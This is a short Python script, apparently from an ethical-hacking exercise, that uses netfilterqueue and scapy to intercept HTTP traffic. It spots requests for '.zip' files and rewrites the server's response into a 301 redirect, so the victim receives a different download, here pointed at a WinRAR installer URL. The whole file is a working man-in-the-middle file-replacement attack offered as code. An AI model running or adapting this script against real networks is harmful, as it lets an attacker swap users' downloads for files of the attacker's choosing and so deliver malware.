#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
# Todo menu for mt pc or other pc forwarding
# TODO run bash to create a iptables queue and use bind to bind them
#TODO flush q after closing

ip="10.0.2.5"
ack_list=[]

def set_load(packet,payload):

    packet[  scapy.Raw].load = payload
    # scapy automatically recalculate fields
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# TODO keyboard interrupt https and iptables

def process_packet(packet):
    scapy_packet=scapy.IP(packet.get_payload())
    # print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.Raw):
        # default port for http
        if scapy_packet[scapy.TCP].dport==80:
            # print("HTTP Request")
            if ".zip" in str(scapy_packet[scapy.Raw].load):
                print("[+] exe Request")
                # acknowledge req is stored in list
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].sport==80:
            # print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")

                # print(scapy_packet.show())
                # redirect client to wherever we want
                load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe\n\n"
                modified_packet=bytes(set_load(scapy_packet,load))
                packet.set_payload(modified_packet)
                print("[+] File replaced successfully")

        # print(scapy_packet.show())



    packet.accept()


queue=netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)
queue.run()

